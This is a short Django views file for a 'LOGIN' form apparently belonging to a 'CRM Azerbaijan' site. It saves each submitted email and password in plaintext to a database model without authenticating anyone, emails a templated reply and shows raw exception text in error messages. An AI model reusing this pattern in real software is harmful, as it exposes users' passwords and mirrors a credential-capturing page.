from django.shortcuts import render, redirect
from .models import Login
from django.core.cache import cache
from django.contrib import messages
from .models import Login
from django.core.mail import send_mail
from django.conf import settings

# Create your views here.

def home(request):
    return render(request, "index.html")



def submit_form(request):
    if request.method == 'POST':
        if cache.get('form_locked'):
            return render(request, 'index.html')
        
        email = request.POST.get('email')
        password = request.POST.get('password')
        
        user = Login(email=email, password=password)
        
        try:
            user.save()
            
            # Generate email body
            email = request.POST.get('email')
            
            email_body = f"Dear <your name> {email},\n\n <Your message> \n We will get back to you asap \nBest regards, Rauf Mekhraliev!"
            
            # Send email
            send_mail(
                'CRM Azerbaijan',
                email_body,
                settings.DEFAULT_FROM_EMAIL,
                [email],
                fail_silently=False
            )
            
            # Display a success message
            messages.success(request, 'Thank you for submitting the form!')
            return redirect('home')
        except Exception as e:
            # Handle any potential exceptions during form submission
            messages.error(request, f'An error occurred: {str(e)}')
            return redirect('home')
    else:
        context = {
            'title': 'LOGIN',
        }
        return render(request, 'index.html', context)
    

# def google_auth_complete(request):
#     # Handle the logic for the custom redirect URI here
#     # For example, you can process the authentication response and redirect the user to a specific page
#     return redirect('myapp:home')